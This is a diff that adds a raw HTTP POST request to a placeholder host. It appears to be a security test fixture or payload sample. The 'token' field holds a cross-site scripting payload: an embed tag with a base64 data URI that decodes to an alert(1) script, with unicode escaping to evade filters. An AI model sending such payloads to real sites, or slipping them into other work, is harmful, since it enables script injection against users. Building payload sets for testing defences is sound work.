@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 103
+Connection: close
+
+token=\u003Cembed src=\u0022data:text/html\u003Bbase64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\u0022\u003E
